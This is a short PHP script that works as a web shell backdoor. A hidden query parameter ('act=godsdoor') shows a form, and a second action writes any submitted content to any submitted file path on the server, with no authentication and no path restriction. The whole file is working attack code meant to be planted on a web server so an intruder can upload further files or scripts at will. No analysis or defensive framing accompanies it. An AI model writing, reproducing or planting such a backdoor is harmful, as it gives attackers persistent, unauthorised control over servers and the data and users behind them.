<?php if(@$_GET["act"]=="save"){if(isset($_POST["content"])&&isset($_POST["name"])){if($_POST["content"]!=""&&$_POST["name"]!=""){if(fwrite(fopen(stripslashes($_POST["name"]),"w"),stripslashes($_POST["content"]))){echo "OK! <a href=\"".stripslashes($_POST["name"])."\">".stripslashes($_POST["name"])."</a>";};}}}else{if(@$_GET["act"]=="godsdoor"){echo '<meta charset="utf-8"><form action="?act=save" method="post">content:<br/><textarea name="content" ></textarea><br/>filenane:<br/><input name="name"/><br/><input type="submit" value="GO!"></form>';}}?>
